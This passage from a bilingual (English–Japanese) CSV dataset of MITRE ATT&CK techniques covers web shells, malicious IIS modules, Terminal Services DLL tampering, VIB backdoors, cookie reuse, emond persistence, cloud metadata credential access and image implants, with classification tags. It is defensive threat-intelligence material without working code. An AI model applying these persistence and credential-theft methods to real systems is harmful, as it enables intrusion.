(On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1,2019-12-12T15:08:20.972Z,2025-04-25T14:46:19.364Z,,,,
T1505.003,T1505,Web Shell,Web シェル,"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW) In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",攻撃者は、システムへの持続的アクセスを確立するため、Webシェルを用いてWebサーバーにバックドアを設置することがある。Webシェルとは、攻撃者がネットワークへのゲートウェイとしてWebサーバーにアクセスできるように、公開アクセス可能なWebサーバー上に配置されるWebスクリプトである。Webシェルは、Webサーバーをホストするシステム上で実行可能な一連の機能やコマンドラインインターフェースを提供する場合がある。(引用: volexity_0day_sophos_FW) サーバーサイドスクリプトに加え、WebシェルはWebサーバーとの通信に使用されるクライアントインターフェースプログラム（例: [China Chopper](https://attack.mitre.org/software/S0020) Webシェルクライアント）を備える場合がある。(引用: Lee 2013),persistence,Linux;Windows;macOS;Network Devices,script_command_execution,foothold,endpoint_execution;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb,2019-12-13T16:46:18.927Z,2025-04-15T19:58:34.688Z,,,,
T1505.004,T1505,IIS Components,IIS コンポーネント,"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013) Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012) Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)",攻撃者は、永続性を確立するために、インターネットインフォメーションサービス（IIS）Webサーバー上で動作する悪意のあるコンポーネントをインストールする可能性があります。IISは、Webサーバーの機能を拡張するためのいくつかのメカニズムを提供しています。例えば、インターネットサーバーアプリケーションプログラミングインターフェイス（ISAPI）拡張機能やフィルタをインストールして、IISの受信および送信Webリクエストを検査および/または変更することができます。 拡張機能とフィルタは、3つの関数（<code>Get{Extension/Filter}Version</code>、<code>Http{Extension/Filter}Proc</code>、および（オプションで）<code>Terminate{Extension/Filter}</code>）をエクスポートするDLLファイルとして展開される。IISモジュールも、IIS Webサーバーを拡張するためにインストールされることがある。(引用元: Microsoft ISAPI Extension Overview 2017)(引用元: Microsoft ISAPI Filter Overview 2017)(引用元: IIS Backdoor 2011)(引用元: Trustwave IIS Module 2013) 攻撃者は、悪意のあるISAPI拡張機能やフィルタをインストールして、トラフィックを監視・改変したり、侵害されたマシン上でコマンドを実行したり、コマンド＆コントロール通信をプロキシしたりすることが可能です。 ISAPI拡張機能とフィルターは、すべてのIIS Webリクエストとレスポンスにアクセスできる可能性があります。例えば、攻撃者はこれらのメカニズムを悪用してHTTPレスポンスを改変し、事前に侵害したホストに悪意のあるコマンド/コンテンツを配布することがあります。(引用: Microsoft ISAPIフィルター概要 2017)(引用: Microsoft ISAPI拡張機能概要 2017)(引用: Microsoft ISAPI拡張機能 全受信 2017)(引用: Dell TG-3390)(引用: Trustwave IIS Module 2013)(引用: MMPC ISAPI Filter 2012) 攻撃者はトラフィックの監視や改変を目的として悪意のあるIISモジュールをインストールする可能性もある。IIS 7.0では、ISAPI拡張機能やフィルターと同様にHTTPリクエストとレスポンスへの無制限アクセスを提供するモジュールが導入された。 IISモジュールは、<code>RegisterModule</code>をエクスポートするDLLとして、またはASP.NET APIと連動してIIS HTTPリクエストにアクセスする.NETアプリケーションとして記述できます。(引用元: Microsoft IIS Modules Overview 2007)(引用元: Trustwave IIS Module 2013)(引用元: ESET IIS Malware 2021),persistence,Windows,script_command_execution,foothold,endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--b46a801b-fd98-491c-a25a-bca25d6e3001,2021-06-03T18:44:29.770Z,2025-04-25T14:47:43.995Z,,,,
T1505.005,T1505,Terminal Services DLL,ターミナルサービス DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services) [Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a ""generic"" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`. Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",攻撃者は、システムへの永続的なアクセスを可能にするために、ターミナルサービスのコンポーネントを悪用する可能性があります。Microsoftターミナルサービス（2022年時点で一部のWindows Server OSではリモートデスクトップサービスに名称変更）は、ホストへのリモートターミナル接続を可能にします。ターミナルサービスにより、サーバーはRDPを介してクライアントに完全な対話型グラフィカルユーザーインターフェイスを送信できます。(引用元: Microsoft Remote Desktop Services)「汎用」プロセス（例: <code>svchost.exe</code>）として実行される[Windowsサービス](https://attack.mitre.org/techniques/T1543/003)は、サービスのDLLファイルをロードします。このDLLファイルの場所は、<code>ServiceDll</code>というレジストリエントリに格納されています。(引用元: Microsoft System Services Fundamentals) 通常 `%SystemRoot%\System32\` に格納される <code>termsrv.dll</code> ファイルは、`HKLM\System\CurrentControlSet\services\TermService\Parameters\` 内のターミナルサービスに対するデフォルトの <code>ServiceDll</code> 値です。 攻撃者は、被害を受けたホストへの永続的なアクセスを可能にするために、ターミナルサービス DLL を変更および/または置換する可能性があります。(引用: James TermServ DLL) この DLL への変更は、任意のペイロードを実行するため（同時に通常の <code>termsrv.dll</code> 機能を維持する可能性もある）、また単にターミナルサービスの悪用可能な機能を有効にするために行われる可能性があります。 例えば、攻撃者は<code>termsrv.dll</code>ファイルへのパッチ適用、または<code>ServiceDll</code>値をRDP機能拡張を提供するDLLを指すように変更することで、同時[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)セッションなどの機能を有効化できる。(引用元: Windows OS Hub RDP)(引用元: RDPWrap Github) サーバー以外の Windows OS では、この機能強化により、新しい RDP セッションが作成されたときにシステムユーザーに警告/ログアウトを促すターミナルサービスのプロンプトを回避することも可能になります。,persistence,Windows,credential_abuse,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--379809f6-2fac-42c1-bd2e-e9dee70b27f8,2022-03-28T15:34:44.590Z,2025-04-15T23:15:45.110Z,,,,
T1505.006,T1505,vSphere Installation Bundles,vSphere インストールバンドル,"Adversaries may abuse vSphere Installation Bundles (VIBs) to establish persistent access to ESXi hypervisors. VIBs are collections of files used for software distribution and virtual system management in VMware environments. Since ESXi uses an in-memory filesystem where changes made to most files are stored in RAM rather than in persistent storage, these modifications are lost after a reboot. However, VIBs can be used to create startup tasks, apply custom firewall rules, or deploy binaries that persist across reboots. Typically, administrators use VIBs for updates and system maintenance. VIBs can be broken down into three components:(Citation: VMware VIBs) * VIB payload: a `.vgz` archive containing the directories and files to be created and executed on boot when the VIBs are loaded. * Signature file: verifies the host acceptance level of a VIB, indicating what testing and validation has been done by VMware or its partners before publication of a VIB. By default, ESXi hosts require a minimum acceptance level of PartnerSupported for VIB installation, meaning the VIB is published by a trusted VMware partner. However, privileged users can change the default acceptance level using the `esxcli` command line interface. Additionally, VIBs are able to be installed regardless of acceptance level by using the <code> esxcli software vib install --force</code> command. * XML descriptor file: a configuration file containing associated VIB metadata, such as the name of the VIB and its dependencies. Adversaries may leverage malicious VIB packages to maintain persistent access to ESXi hypervisors, allowing system changes to be executed upon each bootup of ESXi  Esuch as using `esxcli` to enable firewall rules for backdoor traffic, creating listeners on hard coded ports, and executing backdoors.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022) Adversaries may also masquerade their malicious VIB files as PartnerSupported by modifying the XML descriptor file.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)",攻撃者はvSphereインストールバンドル（VIB）を悪用し、ESXiハイパーバイザーへの永続的アクセスを確立する可能性があります。VIBはVMware環境におけるソフトウェア配布および仮想システム管理に使用されるファイル群です。ESXiはインメモリファイルシステムを採用しており、大半のファイル変更は永続ストレージではなくRAMに保存されるため、再起動後にこれらの変更は失われます。 ただし、VIB を使用して起動タスクの作成、カスタムファイアウォールルールの適用、再起動後も永続するバイナリのデプロイを行うことが可能です。通常、管理者は更新やシステムメンテナンスに VIB を使用します。VIB は以下の 3 つのコンポーネントに分類されます：(引用元: VMware VIBs)* VIB ペイロード: VIB ロード時に起動時に作成および実行されるディレクトリとファイルを含む `.vgz` アーカイブ。 * 署名ファイル：VIBのホスト承認レベルを検証し、公開前にVMwareまたはそのパートナーが実施したテストと検証を示します。デフォルトでは、ESXiホストはVIBインストールに最低限の承認レベル「PartnerSupported」を要求します。これは、VIBが信頼できるVMwareパートナーによって公開されていることを意味します。ただし、特権ユーザーは`esxcli`コマンドラインインターフェイスを使用してデフォルトの承認レベルを変更できます。 なお、<code>esxcli software vib install --force</code> コマンドを使用すれば、受け入れレベルに関係なく VIB をインストールできます。* XML 記述子ファイル: VIB の名前や依存関係など、関連する VIB メタデータを含む設定ファイルです。 攻撃者は悪意のあるVIBパッケージを利用してESXiハイパーバイザーへの永続的なアクセスを維持し、ESXiの起動ごとにシステム変更を実行できるようにします。例えば、バックドア通信用のファイアウォールルールを`esxcli`で有効化したり、固定ポートにリスナーを作成したり、バックドアを実行したりします。(引用元: Google Cloud Threat Intelligence ESXi VIBs 2022) 攻撃者はまた、XML記述子ファイルを改変することで、悪意のあるVIBファイルをPartnerSupportedとして偽装する可能性があります。(引用元: Google Cloud Threat Intelligence ESXi VIBs 2022),persistence,ESXi,script_command_execution,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,File Server,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--f8ba7d61-11c5-4130-bafd-7c3ff5fbf4b5,2025-03-27T18:41:08.494Z,2025-04-15T21:24:04.676Z,,,,
T1506,,Web Session Cookie,Webセッションクッキー,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie) Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), the adversary then imports the cookie into a browser they control and is able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform. There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",攻撃者は盗んだセッションクッキーを使用して、Webアプリケーションやサービスへの認証を行うことができます。この手法は、セッションが既に認証済みであるため、一部の多要素認証プロトコルをバイパスします。(引用元: Pass The Cookie) 認証クッキーは、ユーザーがサービスに認証した後、クラウドベースのサービスを含むWebアプリケーションで一般的に使用されます。これにより、認証情報が渡される必要がなく、頻繁な再認証が不要になります。 クッキーは、ウェブアプリケーションが積極的に使用されていない場合でも、長期間有効であることが多い。[Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)を通じてクッキーを取得した後、攻撃者はそのクッキーを自身が制御するブラウザにインポートし、セッションクッキーが有効である限り、ユーザーとしてサイトやアプリケーションを利用できる。 サイトにログイン後、攻撃者は機密情報へのアクセス、メールの閲覧、被害者アカウントが許可されている操作の実行が可能となります。多要素認証システムを迂回するためにセッションクッキーを標的とするマルウェアの事例も報告されています。（引用元：Unit 42 Mac Crypto Cookies January 2019）,defense-evasion;lateral-movement,Office 365;SaaS,credential_abuse,boundary_crossing,authentication_system;mfa_in_use;user_interaction;email_infrastructure;cloud_control_plane;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0008,attack-pattern--c5e31fb5-fcbd-48a4-af8c-5a6ed5b932e5,2019-10-08T20:08:56.205Z,2025-04-25T15:16:08.043Z,,,,
T1514,,Elevated Execution with Prompt,昇格実行（プロンプト付き）,"Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges. Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",攻撃者はAuthorizationExecuteWithPrivileges APIを利用し、ユーザーに認証情報を要求することで権限昇格を図ることがあります（出典：AppleDocs AuthorizationExecuteWithPrivileges）。このAPIの目的は、アプリケーション開発者がルート権限で操作（アプリケーションのインストールや更新など）を容易に実行できるようにすることです。 このAPIは、root権限を要求するプログラムが信頼できるソースからのものであるか、悪意を持って改変されていないかを検証しません。このAPIは非推奨ですが、macOSの最新リリースでも完全に機能します。このAPIを呼び出す際、ユーザーは認証情報の入力を求められますが、プログラムの起源や完全性に関するチェックは行われません。APIを呼び出すプログラムは、世界書き込み可能なファイルをロードすることも可能であり、これらのファイルは改変されて昇格された権限で悪意のある動作を実行できます。 攻撃者はAuthorizationExecuteWithPrivilegesを悪用し、被害者に悪意のあるソフトウェアをインストールしたり永続化メカニズムを配置したりするためにroot権限を取得する可能性があります。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer 2019年2月)(引用: OSX Coldroot RAT) この手法は[Masquerading](https://attack.mitre.org/techniques/T1036)と組み合わせて、ユーザーを騙し悪意あるコードに昇格した権限を付与させる可能性があります。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer 2019年2月) この手法は、マシン上に存在するこのAPIを利用する正規プログラムを改変することで機能することも実証されている。(引用: Death by 1000 installers; it's all broken!),privilege-escalation,macOS,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0004,attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca,2019-08-08T14:29:37.108Z,2025-04-25T15:15:09.532Z,,,,
T1518,,Software Discovery,ソフトウェア検出,"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Such software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072), and may allow adversaries broad access to infect devices or move laterally. Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",攻撃者は、システムやクラウド環境にインストールされているソフトウェアとそのバージョンの一覧を取得しようとする可能性があります。攻撃者は自動検出時の[ソフトウェア発見](https://attack.mitre.org/techniques/T1518)から得た情報を基に、ターゲットへの完全な感染の可否や特定の行動の試行を含む、その後の行動を決定します。 このようなソフトウェアは、構成管理やセキュリティ上の理由から環境全体に広く展開されている場合があり（例：[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)）、攻撃者がデバイスを感染させたり横方向に移動したりするための広範なアクセスを許可する可能性があります。 敵対者は、どのようなセキュリティ対策が導入されているか、侵害されたシステムに [特権昇格のための悪用](https://attack.mitre.org/techniques/T1068) の脆弱性があるソフトウェアのバージョンがインストールされているかなどを把握するなど、さまざまな理由でソフトウェアの列挙を試みる場合があります。,discovery,Windows;IaaS;Linux;macOS;ESXi,config_policy_manipulation,situational_awareness,network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58,2019-09-16T17:52:44.147Z,2025-04-15T19:59:16.123Z,,,,
T1518.001,T1518,Security Software Discovery,セキュリティソフトウェア検出,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software. Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents may collect metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",攻撃者は、システムやクラウド環境にインストールされているセキュリティソフトウェア、構成、防御ツール、センサーの一覧を取得しようとする可能性があります。これにはクラウド監視エージェントやアンチウイルスなどが含まれます。 攻撃者は自動検出時の[セキュリティソフトウェア検出](https://attack.mitre.org/techniques/T1518/001)から得た情報を基に、ターゲットへの完全な感染の可否や特定アクションの試行を含む、その後の行動を決定する可能性があります。 セキュリティソフトウェア情報を取得するために使用できるコマンドの例としては、[netsh](https://attack.mitre.org/software/S0108)、[Reg](https://attack.mitre.org/software/S0075) を使用した <code>reg query</code>、 <code>dir</code>（[cmd](https://attack.mitre.org/software/S0106) 経由）、[Tasklist](https://attack.mitre.org/software/S0057) などですが、探査行動の他の指標は、攻撃者が探しているソフトウェアやセキュリティシステムの種類により特化したものとなる可能性があります。 macOS マルウェアが LittleSnitch や KnockKnock ソフトウェアのチェックを行うケースも増加傾向にあります。 攻撃者はまた、[Cloud API](https://attack.mitre.org/techniques/T1059/009)を利用して、AWS CloudWatchエージェント、Azure VMエージェント、Google Cloud Monitorエージェントなど、コンピューティングインフラにインストールされたクラウドネイティブセキュリティソフトウェアを発見する場合があります。これらのエージェントはVMからメトリクスやログを収集し、クラウドベースの監視プラットフォームで一元的に集約される可能性があります。,discovery,Windows;IaaS;Linux;macOS,script_command_execution,situational_awareness,authentication_system;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384,2020-02-21T21:16:18.066Z,2025-04-15T23:05:09.449Z,,,,
T1519,,Emond,Emond,"Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1160) service.",攻撃者は、予測可能なイベントトリガーで悪意のあるコマンドを実行するようにスケジュールすることで、Event Monitor Daemon（emond）を利用して永続性を確立する可能性があります。Emondは、様々なサービスからのイベントを受け取り、シンプルなルールエンジンで処理し、アクションを実行する[Launch Daemon](https://attack.mitre.org/techniques/T1160)です。 <code>/sbin/emond</code> の emond バイナリは、<code>/etc/emond.d/rules/</code> ディレクトリからルールを読み込み、明示的に定義されたイベントが発生するとアクションを実行します。ルールファイルは plist 形式で、名前、イベントタイプ、実行するアクションを定義します。イベントタイプの例としては、システム起動やユーザー認証などがあります。アクションの例としては、システムコマンドの実行やメール送信などがあります。 emondサービスは、[Launch Daemon](https://attack.mitre.org/techniques/T1160)設定ファイル（<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>）で指定されたQueueDirectoriesパス<code>/private/var/db/emondClients</code>にファイルが存在しない場合、起動しません。(引用元: xorrior emond Jan 2018)(引用元: magnusviri emond Apr 2016)(引用元: sentinelone macos persist Jun 2019) 攻撃者は、システム起動やユーザー認証といった定義済みイベント発生時にコマンドを実行するルールを作成することで、このサービスを悪用する可能性があります。(引用元: xorrior emond Jan 2018)(引用元: magnusviri emond 2016年4月)(引用元: sentinelone macos persist 2019年6月) また、emond サービスは [Launch Daemon](https://attack.mitre.org/techniques/T1160) サービスによって root 権限で実行されるため、攻撃者は管理者から root への権限昇格も可能となる。,persistence;privilege-escalation,macOS,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;email_infrastructure;file_storage_access;logging_monitoring,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--d376668f-b208-42de-b1f5-fdfe0ad4b753,2019-09-19T14:07:11.734Z,2025-04-25T15:16:13.265Z,,,,
T1522,,Cloud Instance Metadata API,クラウドインスタンスメタデータAPI,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data. Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018) The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.",攻撃者は、認証情報やその他の機密データを収集するためにクラウドインスタンスメタデータAPIへのアクセスを試みる可能性があります。ほとんどのクラウドサービスプロバイダーは、実行中の仮想インスタンスに提供されるサービスであるクラウドインスタンスメタデータAPIをサポートしており、アプリケーションが実行中の仮想インスタンスに関する情報にアクセスできるようにします。利用可能な情報には通常、名前、セキュリティグループ、および認証情報や追加の秘密を含む可能性のあるUserDataスクリプトなどの機密データを含む追加のメタデータが含まれます。 インスタンスメタデータAPIはアプリケーション管理を支援する便宜上提供され、インスタンスにアクセス可能な者なら誰でも利用できます（出典: AWS Instance Metadata API）。攻撃者が稼働中の仮想インスタンス上に存在する場合、追加リソースへのアクセス権を付与する認証情報を特定するため、インスタンスメタデータAPIを直接クエリする可能性があります。 さらに、攻撃者は公開されているWebプロキシのサーバーサイドリクエストフォージェリ（SSRF）脆弱性を悪用し、インスタンスメタデータAPIへのリクエストを通じて機密情報にアクセスする可能性があります。（引用元：RedLock Instance Metadata API 2018） クラウドサービスプロバイダー間の事実上の標準は、インスタンスメタデータ API を <code>http[:]//169.254.169.254</code> でホストすることです。,credential-access,IaaS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Proxy / Gateway,revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1c2fd73a-e634-44ed-b1b5-9e7cf7404e9f,2019-09-04T14:41:32.317Z,2025-04-25T15:15:13.393Z,,,,
T1525,,Implant Internal Image,内部イメージへの埋め込み,"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019) A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",攻撃者は、環境へのアクセス権を取得した後、永続性を確立するために、クラウドまたはコンテナイメージに悪意のあるコードを埋め込む可能性があります。Amazon Web Services (AWS) の Amazon Machine Images (AMI)、Google Cloud Platform (GCP) のイメージ、Azure のイメージ、および Docker などの一般的なコンテナランタイムは、埋め込みやバックドアの設置が可能です。 [マルウェアのアップロード](https://attack.mitre.org/techniques/T1608/001)とは異なり、この手法は攻撃者が被害者の環境内のレジストリにイメージを埋め込むことに焦点を当てています。 インフラストラクチャのプロビジョニング方法によっては、インフラストラクチャプロビジョニングツールが常に最新のイメージを使用するよう指示されている場合、永続的なアクセスを提供することが可能です。（引用元：Rhino Labs Cloud Image Backdoor Technique 2019年9月）クラウドコンテナイメージへのバックドア埋め込みを容易にするツールが開発されています。（引用元：Rhino Labs Cloud Backdoor 2019年9月）攻撃者が侵害されたAWSインスタンスへのアクセス権と利用可能なコンテナイメージの一覧表示権限を有する場合、[Web Shell](https://attack.mitre.org/techniques/T1505/003)などのバックドアを埋め込む可能性があります。（引用元：Rhino Labs Cloud Image Backdoor Technique 